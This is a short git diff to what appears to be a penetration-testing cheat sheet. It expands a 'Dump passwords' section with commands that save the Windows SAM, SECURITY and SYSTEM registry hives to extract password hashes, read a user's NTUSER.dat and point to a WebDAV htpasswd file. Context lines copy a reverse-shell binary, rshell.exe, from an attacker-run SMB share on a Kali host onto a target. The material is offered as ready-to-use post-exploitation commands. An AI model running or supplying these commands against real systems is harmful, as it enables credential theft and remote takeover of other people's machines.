@@ -758,12 +758,18 @@ Find Running Services:
 $ sc query state=all
 ```
 
-Dump passwords:
+Dump passwords / hardcoded credentials:
 ```powershell
+# Password hashes
 $ reg.exe save hklm\sam c:\sam_backup
 $ reg.exe save hklm\security c:\security_backup
 $ reg.exe save hklm\system c:\system
+
+# User password
 $ type C:\Users\[username]\NTUSER.dat
+
+# WebDAV passwords
+$ /xampp/security/webdav.htpasswd
 ```
     
 Cached Credentials:
@@ -865,8 +871,6 @@ http://carnal0wnage.attackresearch.com/2017/08/certutil-for-delivery-of-files.ht
 # Powershell method
 $ impacket-smbserver files `pwd`            # @KALI: Set up a SMB server with files=share `pwd`=workingdir.
 PS> xcopy \\10.10.14.3\files\rshell.exe .   # @TARGET: Copy rshell.exe from remote share to current dir.
-
-
 ```
 
 # MSFVENOM PAYLOADS
